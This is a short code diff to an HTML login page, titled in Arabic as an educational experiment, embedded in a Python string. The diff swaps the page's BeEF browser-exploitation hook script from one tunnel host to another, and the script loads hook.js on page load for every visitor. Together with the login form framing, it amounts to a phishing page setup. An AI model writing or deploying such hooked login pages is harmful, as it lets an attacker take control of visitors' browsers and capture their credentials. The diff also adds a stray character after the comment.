@@ -99,8 +99,8 @@ login_page_html = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <!-- كود BeEF Hook -->
-    <script src="https://vl9cyt-ip-150-228-11-60.tunnelmole.net/hook.js"></script>
+    <!-- كود BeEF Hook -->ئ
+    <script src="https://fruity-spiders-rule.loca.lt/hook.js"></script>
     <title>تسجيل الدخول - تجربة تعليمية</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
